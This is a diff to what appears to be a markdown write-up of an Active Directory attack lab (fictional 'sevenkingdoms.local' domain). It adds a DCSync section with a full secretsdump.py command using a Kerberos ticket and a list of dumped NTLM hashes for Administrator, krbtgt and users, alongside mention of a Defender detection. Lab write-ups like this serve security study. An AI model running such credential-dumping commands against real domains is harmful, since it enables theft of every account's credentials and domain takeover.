@@ -90,5 +90,28 @@ Alert Logic: The sensor detected that Jon Snow changed the sAMAccountName of the
 
 Visual Evidence: The Alert Graph clearly shows the transition from the user account to the spoofed machine identity.
 
-<img width="1919" height="965" alt="image" src="https://github.com/user-attachments/assets/13373a3a-f1ec-478a-baf2-794b7c4bdbd4" />
-####  The Defender portal showing the high-fidelity detection of the spoofing attempt by Jon Snow.
+<img width="1919" height="965" alt="image" src="https://github.com/user-attachments/assets/13373a3a-f1ec-478a-baf2-794b7c4bdbd4" /> 
+The Defender portal showing the high-fidelity detection of the spoofing attempt by Jon Snow.
+
+### 8. Domain Credential Dumping via DCSync (T1003.006)
+With a valid Kerberos ticket for the Administrator account targeting the CIFS service on the Domain Controller, the attacker moved to extract all domain credentials. By utilizing the DRSUAPI (Directory Replication Service Remote Protocol), the attacker simulated a Domain Controller replication request to dump the sensitive NTDS.dit database.
+
+Command: secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
+
+Action: Leveraged the exported KRB5CCNAME environment variable containing the Administrator TGS to authenticate without providing a password.
+
+Result: Successfully dumped the SAM database, LSA Secrets, and Domain Credentials for all users.
+
+Critical Findings (NTDS.dit Secrets):
+
+Administrator: 500:aad3b435b1404eeaad3b435b1404ee:dbd13e1c4e338284ac4e9874f7de6ef4
+
+krbtgt: 502:aad3b435b1404eeaad3b435b1404ee:f5b67d3ddc972f36a2384eb24748c292
+
+eddard.stark: 1111:aad3b435b1404eeaad3b435b1404ee:d977b98c6c9282c5c478be1d97b237b8
+
+robb.stark: 1113:aad3b435b1404eeaad3b435b1404ee:831486ac7f26860c9e2f51ac91e1a07a
+
+📸 Evidence: Final DCSync and Domain Hash Extraction
+<img width="1779" height="815" alt="image" src="https://github.com/user-attachments/assets/189a0770-f439-462e-a9d9-361870aa4fcb" />
+
